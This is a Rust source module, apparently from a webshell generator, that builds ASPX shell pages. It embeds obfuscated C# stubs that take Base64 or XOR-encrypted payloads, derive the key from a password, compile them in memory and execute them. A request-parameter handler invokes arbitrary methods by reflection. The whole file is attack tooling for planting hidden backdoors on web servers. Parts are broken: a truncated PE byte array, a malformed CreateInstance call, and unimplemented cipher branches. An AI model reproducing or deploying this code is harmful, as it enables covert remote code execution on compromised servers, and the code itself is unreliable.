/// 获取 ASPX 文件型 Shell 基础模板
/// 占位符 `%s` 是解密存根代码
pub fn get_template() -> String {
    "<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e)\n{\n%s\n}\n</script>".to_string()
}

/// 获取 ASPX 核心执行代码（将被加密）
pub fn get_core() -> String {
    r#"
string pass = Request["pass"];
if (!string.IsNullOrEmpty(pass)) {
    string payload = Request["payload"];
    if (!string.IsNullOrEmpty(payload)) {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(
            new byte[] {0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
        );
        assembly.CreateInstance().GetType().InvokeMember(
            payload,
            System.Reflection.BindingFlags.InvokeMethod,
            null,
            null,
            null
        );
    }
}
"#.to_string()
}

use crate::core::crypto::EncryptionType;

/// 构建 ASPX 解密存根
pub fn build_decrypt_stub(
    encryption: &EncryptionType,
    ciphertext: &str,
    _nonce: &Option<String>,
    _tag: &Option<String>,
    password: &str,
) -> String {
    match encryption {
        EncryptionType::None => {
            format!(
                "string ciphertext = \"{}\";\nbyte[] decoded = System.Convert.FromBase64String(ciphertext);\nstring payload = System.Text.Encoding.UTF8.GetString(decoded);\nSystem.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();\nMicrosoft.CSharp.CSharpCodeProvider provider = new Microsoft.CSharp.CSharpCodeProvider();\nSystem.CodeDom.Compiler.CompilerParameters parameters = new System.CodeDom.Compiler.CompilerParameters();\nparameters.GenerateInMemory = true;\nSystem.CodeDom.Compiler.CompilerResults results = provider.CompileAssemblyFromSource(parameters, payload);\nresults.CompiledAssembly.CreateInstance(\"DynamicCode\").GetType().GetMethod(\"Execute\").Invoke(null, null);\n",
                ciphertext
            )
        }
        EncryptionType::XOR => {
            format!(
                "string ciphertext = \"{}\";\nbyte[] decoded = System.Convert.FromBase64String(ciphertext);\nSystem.Security.Cryptography.SHA256 sha256 = System.Security.Cryptography.SHA256.Create();\nbyte[] key = sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(\"{}\"));\nbyte[] result = new byte[decoded.Length];\nfor (int i = 0; i < decoded.Length; i++) {{\n    result[i] = (byte)(decoded[i] ^ key[i % key.Length]);\n}}\nstring payload = System.Text.Encoding.UTF8.GetString(result);\nSystem.Reflection.Assembly asm = System.Reflection.Assembly.GetExecutingAssembly();\nMicrosoft.CSharp.CSharpCodeProvider provider = new Microsoft.CSharp.CSharpCodeProvider();\nSystem.CodeDom.Compiler.CompilerParameters parameters = new System.CodeDom.Compiler.CompilerParameters();\nparameters.GenerateInMemory = true;\nSystem.CodeDom.Compiler.CompilerResults results = provider.CompileAssemblyFromSource(parameters, payload);\nresults.CompiledAssembly.CreateInstance(\"DynamicCode\").GetType().GetMethod(\"Execute\").Invoke(null, null);\n",
                ciphertext, password
            )
        }
        EncryptionType::AES256GCM => "// AES-256-GCM not implemented for ASPX yet".to_string(),
        EncryptionType::ChaCha20Poly1305 => "// ChaCha20-Poly1305 not implemented for ASPX yet".to_string(),
    }
}
